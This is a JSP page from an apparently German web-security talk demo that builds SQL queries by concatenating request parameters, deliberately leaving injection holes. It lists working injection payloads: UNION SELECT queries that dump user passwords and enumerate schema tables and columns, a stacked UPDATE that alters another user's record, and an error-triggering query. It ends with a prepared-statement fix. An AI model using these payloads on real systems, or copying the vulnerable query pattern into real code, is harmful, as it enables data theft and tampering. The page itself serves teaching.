<%@ page import="de.micromata.talks.websecurity.DatabaseHandler" %>
<%@ page import="java.sql.ResultSet" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@include file="../header.jsp" %>

<div class="jumbotron">
    <h1>Einfache SQL Injection Beispiele</h1>

    Wenn Eingaben die vom Benutzer gemacht werden könne,nicht richtig gehandelt werden.
</div>

<%
    String orderBy = request.getParameter("orderBy");
    if (orderBy == null) {
        orderBy = "name";
    }

    String orderHow = request.getParameter("orderHow");
    if (orderHow == null) {
        orderHow = "DESC";
    }

    final ResultSet usersResults = DatabaseHandler.get().executeQuery("SELECT * FROM PUBLIC.USERS ORDER BY " + orderBy + " " + orderHow);
%>

<table class="table table-bordered">
    <thead>
    <tr>
        <th>
            #
            <a href="?orderBy=pk&orderHow=DESC">&lt;</a>
            <a href="?orderBy=pk&orderHow=ASC"> &gt;</a>
        </th>
        <th>
            Name
            <a href="?orderBy=name&orderHow=DESC">&lt;</a>
            <a href="?orderBy=name&orderHow=ASC">&gt;</a>
        </th>
    </tr>
    </thead>
    <tbody>
    <%
        while (usersResults.next()) {
    %>
    <tr>
        <td><a href="?userID=<%=usersResults.getString(1)%>"><%=usersResults.getString(1)%>
        </a>
        </td>
        <td><%=usersResults.getString(2) %>
        </td>
    </tr>
    <%
        }
    %>
    </tbody>
</table>

<hr/>
<%
    String userId = request.getParameter("userID");
    if (userId == null) {
        userId = "1";
    }
    ResultSet userResult = null;
    if (request.getParameter("preparedStmt") == null) {
        userResult = DatabaseHandler.get().executeQuery("SELECT * FROM  PUBLIC.USERS WHERE pk=" + userId);
    } else {
        userResult = DatabaseHandler.get().executePreparedStmt("SELECT * FROM  PUBLIC.USERS WHERE pk= ?", userId);
    }

    userResult.next();
%>

Benutzer mit der id: <%=userId%>
<ul>
    <li><strong>Id:</strong><%=userResult.getString(1)%>
    </li>
    <li><strong>Name:</strong><%=userResult.getString(2)%>
    </li>
</ul>

<hr/>

<div class="well">
    <h3>Anleitung wie man über Parameter SQL Injection vorbereiten kann:</h3>
    <ul>
        <li><a href="https://www.w3schools.com/sql/sql_union.asp" target="_blank">https://www.w3schools.com/sql/sql_union.asp</a></li>
        <li><a href="http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html" target="_blank">http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html</a></li>
    </ul>
</div>
<hr/>


<div class="well">
    <h3>Bekomme einen Stacktrace:</h3>
    <p>Auf den Button drücken und StackTrace sehen. Der Angreifer kann somit rumprobieren was es für Spalten in der Tabelle gibt. Oder sehen was das für eine Datenabank ist.</p>

    <div class="alert alert-info"><strong>Query:</strong>?orderBy=gibtEsGarnicht</div>
    <a class="btn btn-danger" href="?orderBy=gibtEsGarnicht">StackTrace</a>
</div>

<hr/>


<div class="well">
    <h3>Bekomme Passwörter der Benutzer:</h3>
    <p>Auf den Button drücken um die passörter der Benutzer zu sehen.</p>
    <div class="alert alert-info"><strong>Query:</strong>?userID=-1 and 1=3 UNION SELECT 1,group_concat(name||'-'||password||'<br/>'),3 FROM users</div>
    <a class="btn btn-danger" href="?userID=-1 and 1=3 UNION SELECT 1,group_concat(name||'-'||password||'<br />'),3 FROM users">Passwörter</a>
</div>

<hr/>


<div class="well">
    <h3>Finde andere Tabellen:</h3>

    <p>Auf den Button drücken um alle Tabellen zu sehen.</p>
    <div class="alert alert-info"><strong>Query:</strong>?userID=-1 and 1=3 UNION select 1,group_concat(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = SCHEMA()</div>
    <a class="btn btn-danger" href="?userID=-1 and 1=3 UNION select 1,group_concat(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = SCHEMA()">Tabellen in der DB</a>

    <hr/>

    <p>Auf den Button drücken um alle Spalten der Tabelle zu sehen</p>
    <div class="alert alert-info"><strong>Query:</strong>?userID=-1 and 1=3 UNION select 1,group_concat(column_name),3 from information_schema.columns where table_name='UBER_SECRET_TABLE'</div>
    <a class="btn btn-danger" href="?userID=-1 and 1=3 UNION select 1,group_concat(column_name),3 from information_schema.columns where table_name='UBER_SECRET_TABLE'">Spalten in der Tabelle: 'UBER_SECRET_TABLE'</a>

    <hr/>

    <p>Auf den Button drücken um Daten aus der Tabelle auszulesen</p>
    <div class="alert alert-info"><strong>Query:</strong>?userID=-1 and 1=3 UNION SELECT 1,group_concat(data1||'-'||data2||'<br/>'),3 FROM UBER_SECRET_TABLE</div>
    <a class="btn btn-danger" href="?userID=-1 and 1=3 UNION SELECT 1,group_concat(data1||'-'||data2||'<br />'),3 FROM UBER_SECRET_TABLE">Daten aus der Tabelle 'UBER_SECRET_TABLE'</a>
</div>

<hr/>


<div class="well">
    <h3>Ändere Benutzer mit der ID = 3:</h3>
    <p>Auf den Button 2 mal drücken. Und aus <strong>meppel</strong> wird das Passwort.</p>
    <p>Man kann die Daten von Benutzern verändern. z.B. Adresse wo die Ware hingeschickt werden soll, email adresse usw.</p>

    <div class="alert alert-info"><strong>Query:</strong>?orderHow=DESC;UPDATE+USERS+SET+name=password+WHERE+PK=3;</div>
    <a class="btn btn-danger" href="?orderHow=DESC;UPDATE USERS SET name=password WHERE PK=3">Name = Passwort für Benutzer ID = 3</a>
</div>

<hr/>


<h3>Lösung:</h3>


<div class="well">
    <div class="alert alert-success">
        <strong>Query:</strong>?preparedStmt=true&userID=-1 and 1=3 UNION SELECT 1,group_concat(name||'-'||password||'<br/>'),3 FROM users
    </div>
    <a class="btn btn-success" href="?preparedStmt=true&userID=-1 and 1=3 UNION SELECT 1,group_concat(name||'-'||password||'<br/>'),3 FROM users">Use Prepare Statement</a>
</div>


<%@include file="../footer.jsp" %>